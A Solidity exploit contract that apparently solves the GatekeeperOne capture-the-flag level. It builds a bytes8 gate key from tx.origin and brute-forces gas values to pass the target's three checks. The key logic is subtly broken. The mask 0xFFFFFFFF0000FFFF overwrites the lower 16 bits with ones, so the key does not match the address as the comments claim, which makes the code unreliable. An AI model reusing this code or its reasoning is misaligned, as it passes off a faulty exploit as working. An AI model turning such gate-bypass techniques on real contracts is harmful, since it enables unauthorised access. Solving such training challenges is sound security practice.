// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

/**
 * @title GatekeeperOneExploit
 * @dev Contract to exploit the GatekeeperOne challenge (level 13)
 * This contract aims to bypass the three gates in the GatekeeperOne contract
 */
contract GatekeeperOneExploit {
    address public owner;
    address public gatekeeperAddress;
    bool public success;
    uint256 public gasToUse;
    
    constructor(address _gatekeeperAddress) {
        owner = msg.sender;
        gatekeeperAddress = _gatekeeperAddress;
    }
    
    /**
     * @dev Generate the correct gate key based on the calling address
     * @param _origin The address to generate the key for (tx.origin)
     * @return bytes8 The correct gate key
     */
    function generateGateKey(address _origin) public pure returns (bytes8) {
        // We need to craft a key that meets three conditions:
        // 1. uint32(uint64(key)) == uint16(uint64(key))
        // 2. uint32(uint64(key)) != uint64(key)
        // 3. uint32(uint64(key)) == uint16(uint160(tx.origin))
        
        // Extract the last 2 bytes (16 bits) of the address
        uint16 addressPart = uint16(uint160(_origin));
        
        // Start with the address part
        uint64 key = uint64(addressPart);
        
        // Add a pattern in the higher bits that will make:
        // - The conversion to uint32 drops some non-zero bits (for condition 2)
        // - But the lower 16 bits still match the address part (for conditions 1 and 3)
        key = key | (uint64(0xFFFFFFFF0000FFFF));
        
        return bytes8(key);
    }
    
    /**
     * @dev Try to enter the GatekeeperOne contract with a specific gas limit
     * @param _gasToUse The gas to use for the call
     */
    function enterGate(uint256 _gasToUse) external {
        require(msg.sender == owner, "Only owner can call");
        gasToUse = _gasToUse;
        
        // Generate the gate key based on tx.origin (the original caller)
        bytes8 gateKey = generateGateKey(tx.origin);
        
        // Call the enter function with the specified gas
        bool result = IGatekeeperOne(gatekeeperAddress).enter{gas: gasToUse}(gateKey);
        
        success = result;
    }
    
    /**
     * @dev Brute force the correct gas value to pass gate two
     * @param _baseGas The base gas amount to start with
     * @param _iterations Number of gas values to try
     */
    function bruteForceGas(uint256 _baseGas, uint256 _iterations) external {
        require(msg.sender == owner, "Only owner can call");
        require(_iterations <= 120, "Too many iterations");
        
        bytes8 gateKey = generateGateKey(tx.origin);
        
        // Try different gas values around the base value
        for (uint256 i = 0; i < _iterations; i++) {
            uint256 gasToTry = _baseGas + i;
            
            try IGatekeeperOne(gatekeeperAddress).enter{gas: gasToTry}(gateKey) returns (bool result) {
                if (result) {
                    gasToUse = gasToTry;
                    success = true;
                    return;
                }
            } catch {
                // Continue to the next iteration
            }
        }
    }
    
    /**
     * @dev Check if the exploit was successful
     * @return bool True if the exploit succeeded
     */
    function checkSuccess() external view returns (bool) {
        address entrant = IGatekeeperOne(gatekeeperAddress).entrant();
        return entrant == tx.origin;
    }
}
